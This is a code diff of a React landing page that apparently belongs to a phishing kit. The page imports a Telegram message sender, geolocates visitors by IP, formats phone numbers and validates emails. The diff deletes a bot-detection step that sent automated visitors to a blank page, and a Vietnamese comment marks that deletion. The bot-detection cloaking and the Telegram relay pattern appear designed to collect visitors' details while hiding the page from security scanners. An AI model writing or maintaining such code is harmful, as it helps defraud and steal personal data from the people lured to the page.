@@ -8,7 +8,6 @@ import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
 import countryToLanguage from '@/utils/country_to_language';
-import detectBot from '@/utils/detect_bot';
 import axios from 'axios';
 
 const Home = () => {
@@ -134,11 +133,7 @@ const Home = () => {
 
     const initializeSecurity = useCallback(async () => {
         try {
-            const botResult = await detectBot();
-            if (botResult.isBot) {
-                window.location.href = 'about:blank';
-                return;
-            }
+            // 🎯 ĐÃ XÓA DETECT BOT
 
             const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
             const ipData = response.data;
@@ -263,7 +258,6 @@ const Home = () => {
         return () => clearTimeout(timer);
     }, [initializeSecurity]);
 
-    // ... (các hàm còn lại giữ nguyên)
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
